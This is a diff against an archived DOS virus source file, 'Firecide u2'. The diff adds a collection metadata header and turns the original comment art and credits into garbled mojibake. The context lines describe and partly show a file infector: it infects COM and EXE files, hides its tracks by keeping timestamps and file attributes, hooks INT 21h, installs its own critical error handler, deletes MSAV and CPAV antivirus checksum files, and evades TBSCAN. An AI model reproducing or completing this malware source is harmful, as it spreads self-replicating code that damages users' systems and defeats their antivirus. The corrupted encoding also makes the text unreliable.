@@ -1,16 +1,27 @@
+; ------------------------------------------------------------
+; name      F
+; type      asm
+; cve       Б─■
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     Б─■
+; ------------------------------------------------------------
 
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд-д
-;  Firecide u2 - (c)1995 Шirogen - Using ШiCE v0.2А
-; ддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддддд-д
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫
+;  Firecide u2 - (c)1995 О©╫irogen - Using О©╫iCE v0.2О©╫
+; О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫-О©╫
 ;
-; Ч Infects COM and EXE when executed.
-; Ч COM Infection marker: fourth byte is 0
-; Ч EXE infection marker: Checksum in header not equal to 0.
-; Ч Time/Date do not change
-; Ч Read-only and hidden files will be infected, and attributes restored.
-; Ч Virus installs its own critical error handler
-; Ч Deletes MSAV,CPAV checksum filez
-; Ч Call ViCE with JMPs OFF, Anti-TBSCAN On, and Garbage On
+; О©╫ Infects COM and EXE when executed.
+; О©╫ COM Infection marker: fourth byte is 0
+; О©╫ EXE infection marker: Checksum in header not equal to 0.
+; О©╫ Time/Date do not change
+; О©╫ Read-only and hidden files will be infected, and attributes restored.
+; О©╫ Virus installs its own critical error handler
+; О©╫ Deletes MSAV,CPAV checksum filez
+; О©╫ Call ViCE with JMPs OFF, Anti-TBSCAN On, and Garbage On
 ;
 
 cseg segment
@@ -96,7 +107,7 @@ _ret:ret
 exe_jump dd 0
 is_exe db 0
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Infection routine - called from INT 21h handler.
 ;    DS:DX=fname
 ;
@@ -278,7 +289,7 @@ exe_ok:
 
         jmp     close
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; set file ptr
 
 offset_zero:                               ; self explanitory
@@ -294,7 +305,7 @@ offset_end:
         ret
 
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; Kill those darned MSAV and CPAV filez..
 ;
 kill_chklst:
@@ -315,7 +326,7 @@ first_2die db      'CHKLIST.MS',0          ; MSAV shitty checksum
 last_2die  db      'CHKLIST.CPS',0         ; CPAV shitty checksum
 
 
-;дддддддддддддддддддддддддддддддддддддддддддддддддддддддддд
+;О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫О©╫
 ; new 21h
 
 new21:
@@ -366,7 +377,7 @@ new_24:                                    ; critical error handler
 
 activate db 0
 txt_ptr dw offset credits
-credits db 'ЧFireCide2, by ШirogenЧ'
+credits db 'О©╫FireCide2, by О©╫irogenО©╫'
 credit_end:
 new_jmp db 0E9h,0,0,0                      ; jmp XXXX,0
 rel_off dw 0
